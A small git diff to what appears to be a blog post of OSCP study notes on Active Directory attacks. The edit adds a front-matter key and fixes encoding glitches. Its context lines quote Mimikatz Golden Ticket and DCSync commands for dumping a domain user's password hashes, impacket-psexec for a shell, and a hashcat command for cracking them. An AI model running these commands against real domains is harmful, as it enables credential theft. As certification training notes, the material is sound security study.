@@ -7,6 +7,7 @@ draft: false
 tags:
   - Cybersecurity
   - OSCP
+Related:
 ---
 Related: [OSCP](/posts/oscp/)
 
@@ -266,7 +267,7 @@ Use `Kerberos::Golden` in Mimikatz
 - Gain an interactive shell with `impacket-psexec` (hash format "LMHash:NTHash"): 
 
 # DCSync
-Requires credentials for member of _Domain Admins_,Â _Enterprise Admins_, orÂ _Administrators_
+Requires credentials for member of _Domain Admins_, _Enterprise Admins_, or _Administrators_
 - Mimikatz (On Windows)
 	- `lsadump::dcsync /user:domain\targetuser` (eg. `lsadump::dcsync /user:corp\dave`)
 	- Save as `hashes.dcsync` and crack with Hashcat: `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
